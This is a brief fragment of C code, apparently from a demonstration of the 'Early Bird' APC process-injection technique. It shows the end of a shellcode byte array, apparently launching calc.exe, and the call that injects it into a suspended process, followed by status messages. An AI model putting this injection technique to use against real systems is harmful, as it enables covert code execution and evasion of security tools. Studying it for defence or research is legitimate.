...
0x63,0x2e,0x65,0x78,0x65,0x00
	...
	INFO("Running Early Bird Injection...");
	if (!EarlyBirdInject(hProcess, hThread, Shellcode, shellsize, &pAddress))
	{
		PRINT_ERROR("EarlyBirdInject");
		return 1;
	}

	OKAY("DONE!");

	OKAY("Successfully Injected via Early Bird!");
